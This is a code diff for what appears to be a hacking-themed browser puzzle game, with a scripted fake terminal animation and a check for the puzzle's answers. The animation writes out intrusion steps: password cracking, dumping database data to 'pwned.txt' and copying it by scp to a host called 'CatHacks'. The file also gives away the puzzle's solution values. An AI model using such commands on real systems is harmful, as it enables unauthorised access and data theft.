@@ -3,7 +3,7 @@ let text = "ssh exchangeServerAdmin@dfiing.net -c SHA256 -E logs.t" +
     "\n\`root password: ****************" +
     "\n^ \n\`passwordCracker -t exchangeServerAdmin@dfiing.net\n^\`" +
     "ls -a\n\^\n\`cd Confidential\nls -a\n\^\n\`cat StaticNetworkIPs.txt\n\^\`mysql -h 168.69.69.42 -p -u admin " +
-    "\n\^****************\n\`USE admin;\n\^\n\`SHOW TABLES;\n\`SELECT fName, Lname, position WHERE SecurityClearance = 10;" +
+    "\n\^****************\n\`USE admin;\n\^\n\`SHOW TABLES;\n\`SELECT fName, lName, position WHERE SecurityClearance = 10;" +
     "\n\^\n\`SELECT DISTINCT TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME IN (\'admin\') AND" +
     " TABLE_SCHEMA=\'admin\' INTO OUTFILE \'tmp/pwned.txt\';" +
     "\n\`exit;\n\`scp -c SHA256 exchangeServerAdmin@dfiing.net /tmp/pwned.txt user@CatHacks:22 ~/word.txt" +
@@ -11,7 +11,7 @@ let text = "ssh exchangeServerAdmin@dfiing.net -c SHA256 -E logs.t" +
 let blockNum = 0;
 let textIndex = 0;
 let block = ["ACCESS DENIED",
-    "--------------------------------------------------\nOffical DFIING Server\nDFIING Center for Information Technology Facility\nLinux 5.4.0-60-generic x86_64\n\nThis computer is for authorized users only.\n\n--------------------------------------------------\n",
+    "Password: C@t_h@xz_2021\n--------------------------------------------------\nOffical DFIING Server\nDFIING Center for Information Technology Facility\nLinux 5.4.0-60-generic x86_64\n\nThis computer is for authorized users only.\n\n--------------------------------------------------\n",
     ".\n..\n.AMD\n.bash_history\n.bash_logout\n.bashrc\n.cache\nConfidential\n.java\n.local\n.minecraft\n.mozilla\n.npm\n.nvm\n.putty\nsnap\n.vim\n.viminfo\n.wget-hsts",
     ".\n..\nStaticNetworkIPs.txt\n",
     "admin: 1.0.0.0\nFTPserver: 1.0.0.1\nlogsServer: 128.0.0.1\nserviceWorker: 1.0.0.0\nmysqlserver: 168.69.69.42\n",
@@ -239,16 +239,16 @@ function hideIntro() {
 
 
 // redactied, redacted 3, fax
-function validateLeak(){
+function validateLeak() {
     var first = document.getElementById("firstLeak");
     var second = document.getElementById("secondLeak");
     var third = document.getElementById("thirdLeak");
     console.log(first.value);
     console.log(second.value);
     console.log(third.value);
-    if(first.value == "REDACTED" || first.value == "REDACTED3" || first.value == "FAX"){
-        if(second.value == "REDACTED" || second.value == "REDACTED3" || second.value == "FAX"){
-            if(third.value == "REDACTED" || third.value == "REDACTED3" || third.value == "FAX"){
+    if (first.value == "REDACTED" || first.value == "REDACTED3" || first.value == "FAX") {
+        if (second.value == "REDACTED" || second.value == "REDACTED3" || second.value == "FAX") {
+            if (third.value == "REDACTED" || third.value == "REDACTED3" || third.value == "FAX") {
                 console.log("Success!");
                 document.getElementById("tryAgain").innerHTML = "";
                 showWin();
@@ -260,7 +260,7 @@ function validateLeak(){
     console.log("try again!");
 }
 
-function showWin(){
+function showWin() {
     var x = document.getElementById("winMessage");
     if (x.style.display === "none") {
         x.style.display = "block";
